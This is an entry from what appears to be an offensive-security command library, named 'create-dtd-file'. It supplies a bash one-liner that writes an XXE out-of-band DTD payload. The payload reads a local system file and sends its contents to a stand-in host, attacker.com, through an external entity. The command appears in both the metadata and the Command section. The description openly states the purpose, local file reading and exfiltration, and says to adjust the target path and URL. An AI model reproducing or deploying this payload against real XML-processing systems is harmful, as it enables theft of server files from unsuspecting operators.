---
id: cmd-uuid-2
data: >-
  echo '<!ENTITY % file SYSTEM
  "file:///C:/Windows/system32/drivers/etc/hosts">\n<!ENTITY % eval "<!ENTITY
  &#x25; exfil SYSTEM \'http://attacker.com/?data=%file;\'>">\n%eval;\n%exfil;'
  > exfil.dtd
tags:
  - xxe
  - dtd
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.501Z'
verified: false
validated: true
submitted: true
---
# create-dtd-file

## Command

```bash
echo '<!ENTITY % file SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?data=%file;\'>">\n%eval;\n%exfil;' > exfil.dtd
```

## Description

Creates a DTD file with XXE entities for local file reading and exfiltration. Adjust path and URL as needed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo` | Outputs the DTD content | Yes |
| `>` | Redirect to file | Yes |
| `exfil.dtd` | Output filename | Yes |

## Examples

### Basic Usage

```bash
echo '...' > exfil.dtd
```

Creates the file with default hosts path.

### Advanced Usage

```bash
echo '...' > custom.dtd
```

For different file targets.

## Expected Output

File exfil.dtd created with XXE payload.

## Related

- [[procedures/Host-Malicious-SVG-and-DTD-Files]]
